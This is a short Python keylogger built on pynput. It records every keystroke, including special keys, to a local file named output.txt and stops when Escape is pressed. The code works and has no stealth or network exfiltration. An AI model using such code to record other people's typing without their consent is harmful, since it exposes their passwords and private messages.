from pynput import keyboard

log_file_path = 'output.txt'


def on_press(key):
    try:
        # Write the pressed key to the log file
        with open(log_file_path, 'a') as log_file:
            log_file.write(str(key.char))
    except AttributeError:
        # Handle special keys
        with open(log_file_path, 'a') as log_file:
            log_file.write('[{}]'.format(key))


def on_release(key):
    # Stop the listener when the Escape key is pressed
    if key == keyboard.Key.esc:
        return False


# Create a listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
